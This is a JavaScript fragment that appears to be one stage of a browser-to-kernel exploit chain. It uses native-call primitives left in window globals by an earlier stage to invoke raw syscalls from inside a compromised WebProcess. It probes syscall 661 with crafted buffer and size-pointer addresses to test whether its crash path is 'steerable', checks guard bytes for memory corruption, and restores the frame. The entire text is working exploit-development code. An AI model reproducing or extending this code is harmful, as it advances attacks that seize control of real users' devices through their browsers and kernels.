// K2: the 661 pointer-shape test. Bisect C proved 661 kills the
// WebProcess on ZERO args (marker zc_before_661, everything after
// received nothing). Question: does arg validation precede the crashy
// path when a valid mapped buffer is passed? One call 661(buf, 0x1000)
// with the armed guard/position-encoded frame; a RETURN of any kind
// means the bad path is arg-gated (steerable); a page death means 661
// kills on every shape. If the first call returns, a second call with
// (buf, sizePtr) banks a second shape. Mark before each.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress))
    throw new Error("chain_missing");
  var frame = native.frame;
  var address = native.frameAddress;
  var bufOffset = 0x200, bufLength = 0x1000;
  var guardOffset = bufOffset + bufLength;
  var guardLength = 0x100;
  var sizePtrOffset = 0x1400;
  var regionEnd = sizePtrOffset + 8;
  if (regionEnd > frame.length)
    throw new Error("frame_region_too_small");
  var bufAddress = address + bufOffset;
  var sizeAddress = address + sizePtrOffset;
  var original = Array.from(frame.subarray(bufOffset, regionEnd));
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  function arm() {
    for (var i = 0; i < bufLength; i++)
      frame[bufOffset + i] = (i * 7 + 3) & 255;
    frame.fill(0xa5, guardOffset, guardOffset + guardLength);
    frame[sizePtrOffset] = 0x00; frame[sizePtrOffset + 1] = 0x10;
    for (var z = 2; z < 8; z++) frame[sizePtrOffset + z] = 0;
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("k2_preflight");
  arm();
  mark("k2_before_661_buf");
  var call = native.call("sys661", [bufAddress, bufLength]);
  var errno = (call.value === -1) ? native.readErrno() : null;
  var first = -1, last = -1;
  for (var i = 0; i < bufLength; i++) {
    if (frame[bufOffset + i] !== ((i * 7 + 3) & 255)) {
      if (first === -1) first = i;
      last = i;
    }
  }
  var guardIntact = true;
  for (var g = 0; g < guardLength; g++)
    if (frame[guardOffset + g] !== 0xa5) { guardIntact = false; break; }
  var hex = "";
  if (first !== -1) {
    var dumpStart = bufOffset + first;
    var dumpLength = Math.min(48, last - first + 1);
    for (var d = 0; d < dumpLength; d++)
      hex += ("0" + frame[dumpStart + d].toString(16)).slice(-2);
  }
  var lines = ["s661_pl:" + call.value + "/" +
    (errno === null ? "ok" : errno) + "/x" +
    ((first === -1) ? 0 : last - first + 1) +
    "/g" + (guardIntact ? 1 : 0) + (hex ? "h" + hex : "")];
  mark("k2_after_661_buf");
  if (call.value !== -1 || errno !== 22) {
    arm();
    mark("k2_before_661_sp");
    var call2 = native.call("sys661", [bufAddress, sizeAddress]);
    var errno2 = (call2.value === -1) ? native.readErrno() : null;
    var first2 = -1, last2 = -1;
    for (var i2 = 0; i2 < bufLength; i2++) {
      if (frame[bufOffset + i2] !== ((i2 * 7 + 3) & 255)) {
        if (first2 === -1) first2 = i2;
        last2 = i2;
      }
    }
    lines.push("s661_ps:" + call2.value + "/" +
      (errno2 === null ? "ok" : errno2) + "/x" +
      ((first2 === -1) ? 0 : last2 - first2 + 1));
    mark("k2_after_661_sp");
  }
  for (var r = 0; r < original.length; r++)
    frame[bufOffset + r] = original[r];
  var restored = true;
  for (var r2 = 0; r2 < original.length; r2++)
    if (frame[bufOffset + r2] !== original[r2]) { restored = false; break; }
  var after = native.call("getpid", []);
  mark("k2_done");
  result = { id: "killer_k2_v1",
    status: (after.value === before.value && after.high === 0 &&
      restored) ? "pass" : "fail",
    details: { lines: lines.join(" | ").slice(0, 400),
      pid_ok: after.value === before.value && after.high === 0,
      region_restored: restored } };
} catch (error) {
  result = { id: "killer_k2_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
